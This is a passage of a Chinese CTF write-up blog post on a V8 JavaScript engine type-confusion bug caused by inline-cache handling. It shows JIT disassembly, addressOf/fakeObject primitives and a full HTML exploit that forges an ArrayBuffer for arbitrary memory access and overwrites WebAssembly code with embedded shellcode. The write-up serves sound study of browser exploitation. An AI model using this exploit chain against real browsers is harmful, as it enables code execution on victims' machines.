+<p>仍然没有发生类型混淆，查看JIT代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x3b6d7cc2dfe   19e  48b991c2313f02140000 REX.W movq rcx,0x14023f31c291    ;; object: 0x14023f31c291 &lt;String[#5]: print&gt;</span><br><span class="line">0x3b6d7cc2e08   1a8  48b8000000000e000000 REX.W movq rax,0xe00000000</span><br><span class="line">0x3b6d7cc2e12   1b2  4c8bc6         REX.W movq r8,rsi</span><br><span class="line">0x3b6d7cc2e15   1b5  49baa0792d89ab7f0000 REX.W movq r10,0x7fab892d79a0  (LoadGlobalICTrampoline)    ;; off heap target</span><br><span class="line">0x3b6d7cc2e1f   1bf  41ffd2         call r10</span><br></pre></td></tr></table></figure>
+<p>其中opt函数优化为如下，可以看到其被优化为了数组寻址的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x3e95ea042b5b    3b  55             push rbp</span><br><span class="line">0x3e95ea042b5c    3c  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3e95ea042b5f    3f  56             push rsi</span><br><span class="line">0x3e95ea042b60    40  57             push rdi</span><br><span class="line">0x3e95ea042b61    41  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x3e95ea042b65    45  488975e8       REX.W movq [rbp-0x18],rsi</span><br><span class="line">0x3e95ea042b69    49  493b65e0       REX.W cmpq rsp,[r13-0x20] (external value (StackGuard::address_of_jslimit()))</span><br><span class="line">0x3e95ea042b6d    4d  0f8630000000   jna 0x3e95ea042ba3  &lt;+0x83&gt;</span><br><span class="line">0x3e95ea042b73    53  488b5510       REX.W movq rdx,[rbp+0x10]</span><br><span class="line">0x3e95ea042b77    57  f6c201         testb rdx,0x1</span><br><span class="line">0x3e95ea042b7a    5a  0f8449000000   jz 0x3e95ea042bc9  &lt;+0xa9&gt;</span><br><span class="line">0x3e95ea042b80    60  48b9b9a6cc430b0e0000 REX.W movq rcx,0xe0b43cca6b9    ;; object: 0x0e0b43cca6b9 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line">0x3e95ea042b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx</span><br><span class="line">0x3e95ea042b8e    6e  0f8541000000   jnz 0x3e95ea042bd5  &lt;+0xb5&gt;</span><br><span class="line">0x3e95ea042b94    74  488b5217       REX.W movq rdx,[rdx+0x17]</span><br><span class="line">0x3e95ea042b98    78  488b4217       REX.W movq rax,[rdx+0x17]</span><br><span class="line">0x3e95ea042b9c    7c  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3e95ea042b9f    7f  5d             pop rbp</span><br></pre></td></tr></table></figure>
+<p>考虑到是<code>ICS</code>缓存机制的原因，<code>o.a.b</code>的类型被缓存，因此存入<code>1.1</code>时仍然是以<code>HOLEY_ELEMENTS</code>的方式将<code>1.1</code>打包为<code>HeapNumber</code>，存为了对象，那么我们尝试这样修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a:&#123;b:&quot;haivk&quot;&#125;&#125;;</span><br><span class="line"></span><br><span class="line">function  opt(o)&#123;</span><br><span class="line">    return o.a.b;</span><br><span class="line">&#125;</span><br><span class="line">for(var i = 0; i &lt; 0x20000; i++)&#123;</span><br><span class="line">    opt(obj);</span><br><span class="line">&#125;</span><br><span class="line">//修改点</span><br><span class="line">obj.a = &#123;c:2.2&#125;;</span><br><span class="line"></span><br><span class="line">print(opt(obj));</span><br></pre></td></tr></table></figure>
+<p>上述，我们改了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.a = &#123;c:2.2&#125;;</span><br></pre></td></tr></table></figure>
+<p>即将a改成了另一个<code>Shape</code>形的字典对象，然后调试，可以发现，这回因为没有缓存的原因，<code>obj.a = &#123;c:2.2&#125;;</code>是以<code>unboxed double</code>的形式将数据写入<br><img src="https://p4.ssl.qhimg.com/t018ab59f2c132edbb3.png"><br>而<code>opt</code>函数仍然能够访问<code>obj.a.c</code>是因为opt被优化为了<code>数组寻址</code>的方式，并且opt中仅比较了<code>obj.a</code>的类型是否合法，而没有比较<code>obj.a.b</code>的类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x1c8800bc2b80    60  48b9b9a678b713050000 REX.W movq rcx,0x513b778a6b9    ;; object: 0x0513b778a6b9 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line">0x1c8800bc2b8a    6a  48394aff       REX.W cmpq [rdx-0x1],rcx</span><br><span class="line">0x1c8800bc2b8e    6e  0f8541000000   jnz 0x1c8800bc2bd5  &lt;+0xb5&gt;</span><br><span class="line">0x1c8800bc2b94    74  488b5217       REX.W movq rdx,[rdx+0x17]</span><br><span class="line">0x1c8800bc2b98    78  488b4217       REX.W movq rax,[rdx+0x17]</span><br><span class="line">0x1c8800bc2b9c    7c  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x1c8800bc2b9f    7f  5d             pop rbp</span><br></pre></td></tr></table></figure>
+<p>继续运行，发现发生了类型混淆，1.1被当成一个对象地址，然后取出了一个对象<br><img src="https://p5.ssl.qhimg.com/t01164ed66425905e2a.png"><br>由此，我们可以构造如下两个原语</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var obj1 = &#123;a:&#123;b:1.1&#125;&#125;;</span><br><span class="line">   let f = eval(`(obj1)=&gt;&#123;</span><br><span class="line">      return obj1.a.b;</span><br><span class="line">   &#125;`);</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">      f(obj1);</span><br><span class="line">   &#125;</span><br><span class="line">   obj1.a = &#123;c:obj&#125;;</span><br><span class="line">   var addr = f(obj1);</span><br><span class="line">   return u64f(addr) - 1n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   var obj2 = &#123;x:&#123;y:buf&#125;&#125;;</span><br><span class="line">   let f = eval(`(obj2)=&gt;&#123;</span><br><span class="line">      return obj2.x.y;</span><br><span class="line">   &#125;`);</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">      f(obj2);</span><br><span class="line">   &#125;</span><br><span class="line">   obj2.x = &#123;z:i2f64(addr + 0x1n)&#125;;</span><br><span class="line">   return f(obj2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>由于<code>ICS</code>缓存机制的原因，上述两个原语仅能使用<code>一次</code>，因为调用后，里面的字典对象相关信息会被缓存，因此想要多次利用的话，需要构造多个原语函数，并且每个函数里的字典对象的key互不相同，这里，我们也可以看到，在<code>addressOf</code>里面，我们用的是<code>var obj1 = &#123;a:&#123;b:1.1&#125;&#125;;</code>，而在fakeObj里面，我们用的是<code>var obj2 = &#123;x:&#123;y:buf&#125;&#125;;</code></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>本题的v8版本为<code>7.9.33</code>，在低版本中，还没有<code>compression pointer（指针压缩）</code>机制，因此<code>addressOf</code>可以直接泄露出8字节地址，然后利用fakeObj伪造一个<code>ArrayBuffer</code>实现任意地址读写，由于没有关闭<code>wasm</code>，我们可以利用任意地址读写，修改wasm的shellcode，然后执行wasm就可以执行到我们的shellcode。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var obj1 = &#123;a:&#123;b:1.1&#125;&#125;;</span><br><span class="line">   let f = eval(`(obj1)=&gt;&#123;</span><br><span class="line">      return obj1.a.b;</span><br><span class="line">   &#125;`);</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">      f(obj1);</span><br><span class="line">   &#125;</span><br><span class="line">   obj1.a = &#123;c:obj&#125;;</span><br><span class="line">   var addr = f(obj1);</span><br><span class="line">   return u64f(addr) - 1n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf1(obj) &#123;</span><br><span class="line">   var obj1 = &#123;e:&#123;f:1.1&#125;&#125;;</span><br><span class="line">   let f = eval(`(obj1)=&gt;&#123;</span><br><span class="line">      return obj1.e.f;</span><br><span class="line">   &#125;`);</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">      f(obj1);</span><br><span class="line">   &#125;</span><br><span class="line">   obj1.e = &#123;g:obj&#125;;</span><br><span class="line">   var addr = f(obj1);</span><br><span class="line">   return u64f(addr) - 1n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   var obj2 = &#123;x:&#123;y:buf&#125;&#125;;</span><br><span class="line">   let f = eval(`(obj2)=&gt;&#123;</span><br><span class="line">      return obj2.x.y;</span><br><span class="line">   &#125;`);</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">      f(obj2);</span><br><span class="line">   &#125;</span><br><span class="line">   obj2.x = &#123;z:i2f64(addr + 0x1n)&#125;;</span><br><span class="line">   return f(obj2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line">print(&#x27;faker_addr=&#x27;+faker_addr.toString(16));</span><br><span class="line">wasm_shellcode_ptr_addr = addressOf1(wasmInstance) + 0x80n;</span><br><span class="line">var element_addr = faker_addr - 0x50n;</span><br><span class="line">print(&#x27;element_addr=&#x27; + element_addr.toString(16));</span><br><span class="line">//fake a ArrayBuffer&#x27;s Map</span><br><span class="line">faker[0] = i2f64(0n);</span><br><span class="line">faker[1] = i2f64(0x1900042317080808n);</span><br><span class="line">faker[2] = i2f64(0x00000000084003ffn);</span><br><span class="line">faker[3] = i2f64(0);</span><br><span class="line"></span><br><span class="line">//faker a ArrayBuffer</span><br><span class="line">faker[4] = i2f64(element_addr+0x1n); //map</span><br><span class="line">faker[5] = i2f64(0); //properties</span><br><span class="line">faker[6] = i2f64(0); //elements</span><br><span class="line">faker[7] = p64f(0xffffffff,0); //length</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line">faker[9] = 0x2;</span><br><span class="line"></span><br><span class="line">var arb_ArrayBuffer = fakeObject(element_addr+0x20n);</span><br><span class="line">var adv = new DataView(arb_ArrayBuffer);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//%SystemBreak();</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>通过本题加深了对v8的字典对象的理解，同时学习了<code>wasm</code>在浏览器漏洞中的利用手法。浏览器PWN虽然难但是很有趣。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://mathiasbynens.be/notes/shapes-ics">Shapes and Inline Caches</a><br><a target="_blank" rel="noopener" href="https://hijiangtao.github.io/2018/06/17/Shapes-ICs/">[译] JavaScript 引擎基础：Shapes 和 Inline Caches</a><br><a target="_blank" rel="noopener" href="https://mathiasbynens.be/notes/prototypes">JavaScript engine fundamentals: optimizing prototypes</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cteng/article/details/77151281">简明扼要地谈谈v8的隐藏类和Inline Cache（內联缓存</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/07/house-of-banana/" rel="prev" title="house_of_banana">
+      <i class="fa fa-chevron-left"></i> house_of_banana
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/12/17/qwb2020-final-GOOexec/" rel="next" title="强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）">
+      强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E5%8C%96"><span class="nav-number">2.2.</span> <span class="nav-text">优化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E9%97%B4%E4%BC%98%E5%8C%96"><span class="nav-number">2.2.1.</span> <span class="nav-text">空间优化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Inline-Caches-ICs"><span class="nav-number">2.2.2.</span> <span class="nav-text">Inline Caches (ICs)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch点分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc%E6%9E%84%E9%80%A0"><span class="nav-number">3.2.</span> <span class="nav-text">poc构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">3.3.</span> <span class="nav-text">注意事项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
